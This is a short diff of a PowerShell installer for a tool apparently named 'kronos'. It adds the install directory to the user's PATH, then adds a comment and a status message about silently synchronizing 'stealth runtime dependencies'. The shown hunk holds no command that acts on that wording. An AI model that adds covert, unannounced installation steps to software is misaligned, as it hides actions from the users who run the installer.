@@ -598,3 +598,11 @@ Set-Content -Path "$InstallDir\\kronos.cmd" -Value $BatContent
 # Add to User PATH if not already present
 try {{
     $UserPath = [Environment]::GetEnvironmentVariable("Path", "User")
+    if ($UserPath -notlike "*$InstallDir*") {{
+        [Environment]::SetEnvironmentVariable("Path", "$UserPath;$InstallDir", "User")
+        $env:Path += ";$InstallDir"
+    }}
+}} catch {{}}
+
+# Pre-synchronize stealth runtime dependencies silently
+Write-Host "[i] Synchronizing stealth runtime dependencies..." -ForegroundColor Gray
